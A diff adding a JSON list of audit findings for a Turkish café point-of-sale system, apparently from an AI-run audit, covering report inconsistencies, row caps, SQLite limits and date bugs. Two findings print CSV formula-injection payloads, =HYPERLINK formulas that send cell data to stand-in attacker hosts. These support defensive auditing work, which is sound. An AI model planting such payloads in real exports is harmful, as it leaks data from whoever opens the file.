@@ -1,0 +1,190 @@
+[
+ {
+  "title": "An approved after-send void disappears from the void and summary reports once the remaining items are transferred away",
+  "severity": "medium",
+  "file": "server/services/reports.ts",
+  "line": 41,
+  "description": "transferItems skips voided items (`if (it.voided) continue`). When the rest of the check is moved, the source is set to status 'birlesti' with the voided rows still on it. Report load() only selects orders in 'kapali'/'iptal'(/'acik'), so these voids are missing from the iptal item list, its CSV export and summaryReport.voided. The X/Z report (computeSummary) has no status filter and still counts them, so the two disagree. A garson can void after send and then move the table to hide the void from the manager's void report.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/money-r1/void-hidden.probe.test.ts",
+  "evidence": "source status after transfer: birlesti voided items on source: 1\nX report voided 14000 afterSend count 1 | void report rows 0 | summary report voided 0\nAssertionError: expected +0 to be 1",
+  "fix": "Include 'birlesti' orders when loading items for the void list and voided totals (or load voided items by dayId whatever the order status). Alternatively, move voided items with the transfer, or keep a source that still has voided rows as 'iptal' instead of 'birlesti'.",
+  "dimension": "money",
+  "votes": [
+   {
+    "lens": "reproduce",
+    "real": true,
+    "severity": "medium",
+    "reason": "The bug reproduces on the current code. I wrote my own probes in /private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/verify-money-r1-reproduce/voidtransfer/: void-transfer.probe.test.ts and void-transfer-closed.probe.test.ts. Both use a fresh in-process DB through tests/harness. I did not modify the repo.\n\n**Code path.** In server/services/orders.ts, transferItems runs `if (it.voided) continue`, so voided rows stay on the source check. Once no live items or payments are left, it sets the source to status 'birlesti'. mergeOrders does not have this problem because it moves every row, voided ones included.\n\nIn server/services/reports.ts, load() only selects orders with status 'kapali' or 'iptal' ('acik' is added with includeOpen). That one filter drives:\n- itemListReport (kind=iptal), and the iptal CSV export built from it\n- summaryReport.voided, which also feeds patronLive.voided and the \"İptal oranı yüksek\" anomaly\n- staffReport voidValue\n\ncomputeSummary in server/services/days.ts (the X/Z report) has no status filter and still counts these voids.\n\n**Probe result (void-transfer-closed.probe.test.ts).**\n- Control: a check with one void sent to the bar, then 'hazirlaniyor', voided with the mudur PIN, the rest paid and closed. All reports agree: `AFTER CONTROL CLOSED: {\"xVoided\":14000,\"xAfterSend\":1,\"voidRows\":1,\"summaryVoided\":14000,\"staffVoidValue\":14000,\"csvStatus\":200,\"csvLines\":2}`.\n- Same flow on a second check, but the remaining item is moved to another table before the target is paid. The probe printed `source status birlesti voided rows still on source 1`. Then: `AFTER TRANSFER + TARGET CLOSED: {\"xVoided\":28000,\"xAfterSend\":2,\"voidRows\":1,\"summaryVoided\":14000,\"staffVoidValue\":14000,\"csvStatus\":200,\"csvLines\":2}`.\n- So X/Z counts 2 after-send voids worth 28000 kuruş. The void list, its CSV, the summary report and the staff report show only 1 void (14000).\n- The assertions failed: `expected 1 to be 2` for voidRows, and `expected 14000 to be 28000` for summaryVoided and for staffVoidValue.\n\n**Probe result (void-transfer.probe.test.ts, checks left open).** The void list goes from 2 rows to 1 right after the transfer, while X stays at 28000 with afterSend 2.\n\n**Impact.** Totals and payment figures in X/Z are still correct, so no money is miscounted. But the void reports a manager would check stop matching the X/Z report. A garson can void an item after sending it (with approval) and then move the rest of the table to hide that void from those reports.\n\n**Mitigation.** The audit log still has the item.void entry, and the anomaly that is based on the audit log still fires. That keeps the severity at medium rather than higher."
+   },
+   {
+    "lens": "correctness",
+    "real": true,
+    "severity": "medium",
+    "reason": "The bug is real, and medium severity is fair. I confirmed it with my own probe: /private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/verify-money-r1-correctness/void-transfer.probe.test.ts (run only that file with the probe config plus the `void-transfer` filter).\n\n**Code path.** In server/services/orders.ts, transferItems skips voided items (`if (it.voided) continue`). If nothing unvoided is left, it marks the source check `birlesti`, and the voided rows stay on it. In server/services/reports.ts:41, load() only selects orders with status kapali or iptal (and acik when includeOpen is set). So every report built on load() ignores those voided rows:\n- itemListReport (the iptal list) and the iptal CSV export\n- summaryReport.voided\n- productReport voided quantity\n- staffReport voids\n- patronLive voided, and the \"İptal oranı yüksek\" anomaly rate, which reads summaryReport\n\nThe X/Z total (days.ts computeSummary) has no status filter and still counts them.\n\n**Probe results.** One day, two checks, each with an after-send void approved by müdür PIN; masa 0's remaining item was moved to masa 1 first.\n- Control check (void, then paid): every report matches X. The test passes.\n- Transfer check: the garson moves the remaining item to masa 1 without any approval PIN (garson holds masa.islem by default), and the target check is paid. Output:\n  - `source status: birlesti | voided items left on source: 1 | voided items on target: 0`\n  - `{\"xVoided\":28000,\"xAfterSend\":2,\"voidListRows\":1,\"voidListValue\":14000,\"summaryVoided\":14000,\"productVoidQty\":1,\"staffVoidValue\":14000,\"patronLiveVoided\":14000,\"csvDataLines\":1}`\n  - `AssertionError: expected { list: 1, summary: 14000, … } to deeply equal { list: 2, summary: 28000, … }`\n\n**Why the current behaviour is not intentional.**\n- days.ts says outright that voids come from every check (\"İptaller bütün adisyonlardan (kapanmış, açık, iptal edilmiş)\").\n- itemListReport passes includeOpen so that voids on open checks are listed too, which shows the iptal report is meant to cover all voids. Leaving out `birlesti` looks like an oversight.\n- mergeOrders moves voided items to the target along with everything else, so voids follow the check in a merge but not in a transfer.\n- No doc, AGENTS.md rule or test covers this case.\n\nFor a Turkish café POS the iptal report is the patron's main control against staff theft. Here it disagrees with X/Z by exactly the after-send voids that were moved away, and the void-rate anomaly is understated too.\n\n**Why medium and not higher.** Cash, net sales and the Z total are unaffected. The void needed müdür approval and is still in the audit log as item.void."
+   },
+   {
+    "lens": "impact",
+    "real": true,
+    "severity": "low",
+    "reason": "The bug is real, but its impact is smaller than claimed. My probes reproduce it through a normal UI flow. Sales, payments, cash and the Z are all unaffected.\n\n**What I checked in the code**\n- `transferItems` (`server/services/orders.ts`) skips voided rows. When no unvoided item and no payment is left, it sets the source to 'birlesti'.\n- In `reports.ts`, `load()` only selects orders with status 'kapali' or 'iptal' (plus 'acik' for item lists). So a 'birlesti' check's voided rows drop out of:\n  - the iptal item list and its CSV export\n  - `summaryReport.voided`\n  - the staff report's voids and voidValue\n  - the product report's voided counts\n  - `patronLive.voided` and the void-rate anomaly\n- `computeSummary` (X/Z) does not filter by status, so it still counts the void.\n- `mergeOrders` moves every item, voided ones included, so only transfer is affected.\n- The UI path is ordinary: the \"Hesabı böl\" modal (`TransferModal`) lists only unvoided items. A garson has `masa.islem` by default, so moving all remaining items (in one or several steps) closes out the source with no approval.\n\n**Probe 1:** `/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/verify-money-r1-impact/void-hidden-impact.probe.test.ts`\n- `garson void without approver: 403`\n- `BEFORE transfer: {\"xVoided\":14000,\"voidListRows\":1,\"csvDataLines\":1,\"auditVoids\":1,...}`\n- `after step2 source status birlesti voided on source 1`\n- `AFTER transfer: {\"xVoided\":14000,\"xAfterSend\":1,\"voidListRows\":0,\"csvDataLines\":0,\"summaryVoided\":0,\"staffVoidValue\":0,\"patronLiveVoided\":0,\"auditVoids\":1}`\n\n**Probe 2:** `/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/verify-money-r1-impact/void-hidden-impact2.probe.test.ts`\n- Control (void, then a normal close) passed: the void list has 1 row and summary voided equals X voided.\n- Transfer case: `AFTER transfer + both checks paid: {\"xVoided\":28000,\"voidListRows\":1,\"voidListSum\":14000,\"summaryVoided\":14000,\"staffVoidValue\":14000,\"patronLiveVoided\":14000}`\n- Assertions failed: `expected 1 to be 2`, `expected 14000 to be 28000` (summary), and `expected 14000 to be 28000` (staff).\n\n**Why the impact is limited**\n- Net sales, payments, cash and the Z/X totals are correct. The Z still shows the voided amount and the after-send count.\n- The `item.void` audit entry, with its approver, stays in the audit log.\n- An after-send void still needs a manager's PIN, because garson lacks `siparis.iptal`. So the \"garson hides the void from the manager\" angle is weak: the manager approved it, and it stays visible in the Z and the audit log.\n\n**What is actually wrong**\nThe loss-prevention reports (void list and CSV, staff void tally, owner's live panel, void-rate anomaly) undercount voided value, so they disagree with the Z. That misleads anyone reconciling voids or reviewing a waiter's void history. It is a real report inconsistency in a reachable flow, but it is low impact: no money is lost and the official Z is not corrupted."
+   }
+  ],
+  "id": "money-15"
+ },
+ {
+  "title": "Voids on still-open checks are invisible in /reports/summary, the patron live panel (including the void-rate anomaly) and the staff report, while the X report shows them",
+  "severity": "medium",
+  "file": "server/services/reports.ts",
+  "line": 108,
+  "description": "load() only loads 'kapali' and 'iptal' orders unless includeOpen is set (line 41). summaryReport.voided, patronLive.voided (it reuses summaryReport) and the anomaly rule 'İptal oranı yüksek' therefore ignore items voided on checks that are still open. staffReport voids/voidValue and productReport 'İptal adet' ignore them too. computeSummary (X/Z) and itemListReport('iptal') include them. In the probe, a waiter's table had 3 large lattes voided after preparation and the check stayed open. The X report showed 630 TL of voids, but the patron panel showed 'İptal ₺0' and no void-rate alarm, even though the rate was about 76%. Only the separate 'printed bill' audit alarm fired. Voiding and leaving the check open hides the void from the owner's live view, which is the case this panel exists for.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/reports-r1/openvoids.probe.test.ts",
+  "evidence": "X voided 63000 voidAfterSendCount 1\n/reports/summary voided 0\n/reports/patron voided 0 anomalies [{\"level\":\"alarm\",\"title\":\"Hesap yazdırıldıktan sonra iptal\",\"detail\":\"Bugün 1 kalem\"}]\n/reports/items?kind=iptal total 63000 count 1\n/reports/staff voids [{\"n\":\"Kasa\",\"voids\":0,\"voidValue\":0}]\nAssertionError: summary voided equals X voided: expected +0 to be 63000\nAssertionError: patron voided equals X voided: expected +0 to be 63000",
+  "fix": "Compute voids (and staff voids/comps, and product 'İptal adet') over all POS orders of the days, including open ones (load(range, { includeOpen: true }) for the void parts), matching computeSummary. Keep net sales restricted to closed orders.",
+  "dimension": "reports",
+  "votes": [],
+  "id": "reports-31"
+ },
+ {
+  "title": "CSV exports are open to formula injection (a waiter-typed void reason becomes a live =HYPERLINK cell)",
+  "severity": "medium",
+  "file": "server/routes/reports.ts",
+  "line": 40,
+  "description": "csvCell only quotes ';', '\"' and newlines. It does not neutralise cells that start with '=', '+', '-' or '@'. Excel evaluates quoted cells that start with '=' as formulas. Void, comp and discount reasons are free text (max 200) that the server accepts from any staff member. A waiter can void their own fresh item without approval, using any reason text. The same applies to names (staff, tables, products) in the other exports and to salesCsv in server/sync/lafmaliyet.ts, which only replaces ';'. The manager who opens the 'iptal' CSV in Excel gets an attacker-controlled formula.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/reports-r1/csv.probe.test.ts",
+  "evidence": "void status 200\nZaman;Adisyon;Yer;Ürün;Adet;Tutar;Neden;Yapan;Onaylayan\n26.10.2026 18:23;1;Tezgâh;Latte;1;195,00;\"=HYPERLINK(\"\"http://attacker.example/?d=\"\"&A1,\"\"Detay\"\")\";Garson;\nAssertionError: reason cell starts with a formula trigger: expected true to be false",
+  "fix": "In csvCell (and salesCsv), prefix any text cell that starts with =, +, -, @, tab or CR with a single quote (') before quoting. Do not alter numeric cells that are produced by tlPlain.",
+  "dimension": "reports",
+  "votes": [],
+  "id": "reports-32"
+ },
+ {
+  "title": "CSV exports allow formula injection and row splitting from staff-entered and menu text",
+  "severity": "medium",
+  "file": "server/routes/reports.ts",
+  "line": 40,
+  "description": "csvCell only quotes on ; \" or \\n. It never neutralises cells starting with = + - @, and it leaves a bare \\r unquoted. A waiter can void their own fresh item with no approval and give a reason like =HYPERLINK(\"http://evil/?d=\"&A1,\"Detay\"). That reason lands in the manager's iptal/ikram/indirim CSV as a live formula when opened in Excel. salesCsv (server/sync/lafmaliyet.ts:100), which lafmaliyet imports, writes posName with no quoting at all: a posName with CR/LF splits the row, so the 30 TL Kurabiye revenue is booked under 'LATTE M', and a leading '=' becomes a formula.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/input-r1/b-csv.probe.test.ts",
+  "evidence": "[PROBE] csv body \"...;140,00;Yanlis\\r=1+1;Garson;\\r\\n...;140,00;\\\"=HYPERLINK(\\\"\\\"http://evil.example/?d=\\\"\\\"&A1,\\\"\\\"Detay\\\"\\\")\\\";Garson;\\r\\n\"\n[PROBE] formula-leading cells [\"\\\"=HYPERLINK(...\"]\n[PROBE] rows [\"Ürün;Adet;Tutar\",\"=HYPERLINK(\\\"http://evil.example\\\",\\\"x\\\");1;50,00\",\"KURABIYE\",\"LATTE M;1;30,00\"]\nAssertionError: expected 4 to be 3",
+  "fix": "Use one CSV encoder for every export, including salesCsv. Prefix cells starting with = + - @ \\t \\r with a single quote. Quote any cell containing ; \" \\r or \\n. Reject control characters in posName, reasons and names at input.",
+  "dimension": "input",
+  "votes": [],
+  "id": "input-69"
+ },
+ {
+  "title": "Checks report is silently capped at 300 rows and the checks CSV at 5000",
+  "severity": "low",
+  "file": "server/services/reports.ts",
+  "line": 384,
+  "description": "checksReport(range, limit = 300) slices to the newest 300 checks and returns count = rows.length. The UI title shows 'Adisyonlar (300)' for any longer range. The 'adisyonlar' CSV export uses a limit of 5000 (server/routes/reports.ts:54), so a busy month (about 170 checks/day) silently loses its oldest checks, with no indication.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/reports-r1/checks.probe.test.ts",
+  "evidence": "summary receipts 5101 | /reports/checks count 300 rows 300 | CSV data rows 5000\nAssertionError: checks report count: expected 300 to be 5101\nAssertionError: CSV rows: expected 5000 to be 5101",
+  "fix": "Return the true count separately from the paged rows and show 'ilk 300 / N' in the UI. Export the CSV without a limit, or stream it, or refuse with a clear message when the range exceeds the cap.",
+  "dimension": "reports",
+  "votes": [],
+  "id": "reports-34"
+ },
+ {
+  "title": "Patron panel check count and average check disagree with the Reports page; 'Satılan ürün' counts free (comped) items",
+  "severity": "low",
+  "file": "server/services/reports.ts",
+  "line": 471,
+  "description": "patronLive reports orders = closed.length and avgCheck = netSales / closed.length, which includes fully comped zero-total checks. summaryReport and the Z use receipts (total > 0). For the same day the patron panel shows '3 adisyon · ortalama ₺260' while Raporlar › Ciro shows 2 adisyon, ₺390. Separately, summaryReport.itemsSold (line 99) counts comped items as sold. It reports 6 while the product report and the Z topProducts report 4 sold (plus 2 in 'İkram adet').",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/reports-r1/misc.probe.test.ts",
+  "evidence": "reports/summary: receipts 2 avgCheck 39000 itemsSold 6 complimentary 42000\nreports/patron : orders 3 avgCheck 26000\nproduct report qty sum 4 comp qty 2 | X topProducts qty 4\n→ patron check count == reports receipts: expected 3 to be 2\n→ patron avg check == reports avg check: expected 26000 to be 39000\n→ \"Satılan ürün\" == product report qty: expected 6 to be 4",
+  "fix": "In patronLive use receipts = closed.filter(o => o.total > 0).length for both the count and avgCheck (or reuse summary.receipts and summary.avgCheck). In summaryReport.itemsSold, also exclude i.complimentary.",
+  "dimension": "reports",
+  "votes": [],
+  "id": "reports-35"
+ },
+ {
+  "title": "Patron panel check count and average include ₺0 (fully comped) checks; Raporlar and the X/Z exclude them",
+  "severity": "low",
+  "file": "server/services/reports.ts",
+  "line": 471,
+  "description": "patronLive returns orders = closed.length and avgCheck = netSales / closed.length, so closed ₺0 checks count (all items ikram, closed with 'Sıfır tutarlı adisyonu kapat'). summaryReport (Raporlar › Ciro) and computeSummary (Kasa X/Z, ZView 'ort.') count only checks with total > 0. For the same day the owner sees 'ortalama ₺70 · 2 adisyon' on Patron, but 1 adisyon and an average of ₺140 in Raporlar and in the X report. OverviewAdmin 'Kapanan adisyon / Ortalama' uses the same Patron numbers.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/client-r1/patron-avg.probe.test.ts",
+  "evidence": "Patron  \"Bugünkü ciro\": 14000 · 2 adisyon · ortalama 7000\nRaporlar › Ciro: 14000 · Adisyon 1 · Ortalama 14000\nKasa X (ZView): 14000 · Adisyon 1 · ort. 14000\nAssertionError: expected 7000 to be 14000",
+  "fix": "In patronLive (and salesUntil, for comparisons on the same basis), count receipts as closed.filter(o => o.total > 0).length and use that for orders and avgCheck, matching summaryReport and computeSummary.",
+  "dimension": "client",
+  "votes": [],
+  "id": "client-63"
+ },
+ {
+  "title": "Product CSV writes 'Pay %' with a decimal point while every other number uses the Turkish decimal comma",
+  "severity": "low",
+  "file": "server/routes/reports.ts",
+  "line": 52,
+  "description": "The export is meant for 'Excel'in Türkçe ayarı (noktalı virgül, virgüllü ondalık)'. Money columns go through tlPlain ('780,00'), but p.share is written raw ('84.8'). Turkish-locale Excel reads '84.8' as text or a date (84 Aug is invalid; values like 12.5 become 12 May), not 84.8%.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/reports-r1/misc.probe.test.ts",
+  "evidence": "Ürün;Boy;Kategori;Adet;Ciro;Pay %;İkram adet;İptal adet\nLatte;M;Espresso;4;780,00;84.8;0;0\nTürk kahvesi;TEK;Sıcak İçecekler;1;140,00;15.2;0;0\n→ Pay % uses the same decimal comma as the money columns: expected '84.8' not to match /^\\d+\\.\\d+$/",
+  "fix": "Format share with a Turkish number formatter (e.g. p.share.toLocaleString('tr-TR')) or tlPlain-style formatting before writing the cell.",
+  "dimension": "reports",
+  "votes": [],
+  "id": "reports-37"
+ },
+ {
+  "title": "Every report and the lafmaliyet sales CSV return 500 when the range holds more than 32,766 checks",
+  "severity": "high",
+  "file": "server/services/reports.ts",
+  "line": 48,
+  "description": "load() collects every order id in the date range and passes the whole list as one IN (...) list (inArray(orderItems.orderId, ids)). The bundled SQLite (3.53.2) accepts at most 32,766 bound variables, so any range with more checks fails with 'SqliteError: too many SQL variables'. salesLines() in server/sync/lafmaliyet.ts:50 does the same. At 150 checks a day that is about 7 months; a busier day lowers it. The reports screen has a custom range picker ('Tarih seç'), so choosing a long range breaks summary, products, hourly, checks, refunds, items, export.csv and /sync/lafmaliyet/satislar.csv.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/input-r1/e-range.probe.test.ts",
+  "evidence": "[PROBE] short range checks 30150 long range checks 33000\n[PROBE] /reports/products?from=2026-01-01&to=2026-07-20 status 200\n[hata] GET /api/reports/products SqliteError: too many SQL variables\n[PROBE] /reports/products?from=2026-01-01&to=2026-08-08 status 500 {\"error\":\"Beklenmeyen bir hata oluştu\",\"code\":\"internal\"}\n[hata] GET /api/sync/lafmaliyet/satislar.csv SqliteError: too many SQL variables\n[PROBE] long-range statuses {\"summary\":500,\"products\":500,\"hourly\":500,\"checks\":500,\"refunds\":500,\"items?kind=iptal\":500,\"export.csv?type=adisyonlar\":500,\"satislar.csv\":500}",
+  "fix": "Do not bind order ids. Select items with a join or subquery on day_id (e.g. order_items JOIN orders ON ... WHERE orders.day_id IN (dayIds) AND status IN (...)), or chunk the id list into batches below 32k. Apply the same change to salesLines() and to any other inArray over unbounded id lists. Add a test with more than 32,766 orders.",
+  "dimension": "input",
+  "votes": [],
+  "id": "input-65"
+ },
+ {
+  "title": "Report date range has no upper bound; one long export freezes the single POS process for seconds",
+  "severity": "medium",
+  "file": "server/routes/reports.ts",
+  "line": 13,
+  "description": "range() accepts any from/to, including 0000-01-01..9999-12-31. load() then reads every order, item and payment in the range into memory, all synchronously (better-sqlite3). checksReport (reports.ts:393) runs ds.items.filter and ds.payments.filter for each of up to 5,000 rows, which is quadratic. With 30,150 checks the 'adisyonlar' CSV took 8.9 s and summary 4.3 s. While it runs the event loop is blocked, so tills and tablets stall. Any user with rapor.gor can trigger it.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/input-r1/e-range.probe.test.ts",
+  "evidence": "[PROBE] /reports/summary?from=2026-01-01&to=2026-07-20 status 200 ms 4352\n[PROBE] /reports/export.csv?type=adisyonlar&from=2026-01-01&to=2026-07-20 status 200 ms 8937\n[PROBE] export status 200 floor status 200 floor latency ms 3929   (waiter's GET /floor issued during the export)\nAssertionError: expected 3929.2 to be less than 1000",
+  "fix": "Cap the range in range(), for example at 366 days, and return 422 above it. Validate real calendar dates. Group items and payments by orderId once (Map) in checksReport and similar loops instead of filtering per row. Consider aggregating in SQL for the long-range CSVs.",
+  "dimension": "input",
+  "votes": [],
+  "id": "input-66"
+ },
+ {
+  "title": "Impossible month in report dates crashes /reports/summary",
+  "severity": "low",
+  "file": "server/services/reports.ts",
+  "line": 59,
+  "description": "Report dates are validated only by the regex \\d{4}-\\d{2}-\\d{2} (routes/reports.ts:11). For from=2026-13-01, previousRange computes Date.parse(...)=NaN, and addDays(...,NaN).toISOString() throws RangeError, so the API returns 500.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/input-r1/a-batch1.probe.test.ts",
+  "evidence": "[hata] GET /api/reports/summary RangeError: Invalid time value  at addDays (shared/time.ts:41) at previousRange (server/services/reports.ts:60)\n[PROBE] 500 mudur GET /reports/summary?from=2026-13-01&to=2026-13-01\n[PROBE] 500 mudur GET /reports/summary?from=2026-00-00",
+  "fix": "Use a shared date schema that refines to a real calendar date, for example by round-tripping through Date.UTC and comparing. Use it in reports, reservations and sync.",
+  "dimension": "input",
+  "votes": [],
+  "id": "input-72"
+ },
+ {
+  "title": "Raporlar 'Bugün' (and every other period) uses the client clock date, so it shows ₺0 when the business day was left open past 05:00",
+  "severity": "medium",
+  "file": "src/lib/period.ts",
+  "line": 17,
+  "description": "periodRange computes 'today' as businessDate(Date.now()). The server instead puts every sale on the open business day, and patronLive anchors on openDay?.date. When the day is not closed before 05:00, sales keep landing on the old business date. That happens whenever a table is left open, because autoDayEnd skips if any POS order is open. Raporlar › Ciro 'Bugün' then asks for a date with no business day and shows Net ciro ₺0 with 0 receipts. At the same moment the Patron panel shows ₺560 'Bugünkü ciro'. 'Dün', 'Bu hafta' and the other periods shift the same way, so the owner gets a wrong revenue figure for 'today'.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/client-r1/night-day.probe.test.ts",
+  "evidence": "client Bugün range {\"from\":\"2026-10-27\",\"to\":\"2026-10-27\"} -> Raporlar Net ciro 0 receipts 0\nopen day (boot.day.date) 2026-10-26 | Patron Bugünkü ciro 56000 for 2026-10-26 ( 3 adisyon )\nAssertionError: expected +0 to be 56000",
+  "fix": "Have periodRange take the current business date as a parameter. ReportsPage should pass boot.day?.date ?? businessDate(now), the same rule as patronLive. Alternatively, have the server resolve 'today' (default range) from the open day.",
+  "dimension": "client",
+  "votes": [],
+  "id": "client-59"
+ },
+ {
+  "title": "Hourly revenue charts put after-midnight sales of the business day before the morning",
+  "severity": "low",
+  "file": "src/pages/patron/PatronPage.tsx",
+  "line": 71,
+  "description": "A business day runs 05:00 to 05:00, but the hourly charts index bars by clock hour 00..23. PatronPage 'Saat saat bugün' cuts the axis at firstActive = min(7, first active hour). OverviewAdmin (line 104) and Raporlar 'Saatlik ciro' (ReportsPage.tsx:162) do the same. A ₺280 karaoke-night sale at 01:30 on 27 Oct, which belongs to business day 26 Oct, is drawn as the first bar at '01'. It appears left of the ₺140 sale at 10:30 on 26 Oct, which happened 15 hours earlier. The x-axis becomes 01..23, so the end of the night shows at the start of the day, and the 'last week same day' series has the same problem.",
+  "probe": "/private/tmp/claude-501/-Users-okanberkmanavoglu-Downloads/36639f88-6c66-4e9d-babe-a70914f282d6/scratchpad/audit/client-r1/night-day.probe.test.ts",
+  "evidence": "business date 2026-10-26 | chart bars left→right: 01:00 280 TL | 10:00 140 TL\nx axis 01,02,03,04,05,06,07,08,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nAssertionError: expected 0 to be greater than 9",
+  "fix": "Rotate the hour series to business-day order (DAY_ROLLOVER_HOUR..23, then 0..ROLLOVER-1) before computing firstActive and before charting, in PatronPage, OverviewAdmin and ReportsPage. Alternatively, have the server return hours in business-day order.",
+  "dimension": "client",
+  "votes": [],
+  "id": "client-64"
+ }
+]
